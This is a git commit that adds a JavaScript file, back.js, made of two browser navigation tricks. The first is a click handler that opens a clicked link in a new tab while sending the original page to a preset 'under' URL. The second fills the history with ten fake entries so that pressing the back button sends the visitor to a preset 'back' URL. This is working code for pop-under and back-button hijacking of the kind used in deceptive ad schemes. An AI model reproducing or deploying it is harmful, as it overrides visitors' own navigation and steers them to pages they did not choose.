311f1866d60059b59e29f4225be6480ebf8512e9
smokey2335 <116642185+smokey2335@users.noreply.github.com>
2023-07-17 23:17:22 +0200

    Create back.js

---
+++ back.js
@@ -0,0 +1,50 @@
+if (typeof under !== "undefined" && under !== null) {
+  if (typeof cta !== "undefined" && cta !== null) {
+    document.addEventListener('click', function (event) {
+      var target = event.target;
+      while (target) {
+        if (target.tagName === 'A' && target.classList.contains(cta)) {
+          const linkHref = target.href;
+          event.preventDefault();
+          window.open(linkHref, '_blank');
+          redirectParentWindow(under);
+          break;
+        }
+        target = target.parentNode;
+      }
+    });
+  } else {
+    document.addEventListener('click', function (event) {
+      var target = event.target;
+      while (target) {
+        if (target.tagName === 'A') {
+          const linkHref = target.href;
+          event.preventDefault();
+          window.open(linkHref, '_blank');
+          redirectParentWindow(under);
+          break;
+        }
+        target = target.parentNode;
+      }
+    });
+  }
+}
+
+if (typeof back !== "undefined" && back !== null) {
+  !(function () {
+    var t;
+    try {
+      const URL = window.location.href.split(/[#]/)[0];
+      for (t = 0; 10 > t; ++t) history.pushState({}, '', URL + '#');
+      onpopstate = function (event) {
+        event.state && redirectParentWindow(back);
+      };
+    } catch (o) {
+      console.log(o);
+    }
+  })();
+
+  function redirectParentWindow(url) {
+    window.parent.location.replace(url);
+  }
+}
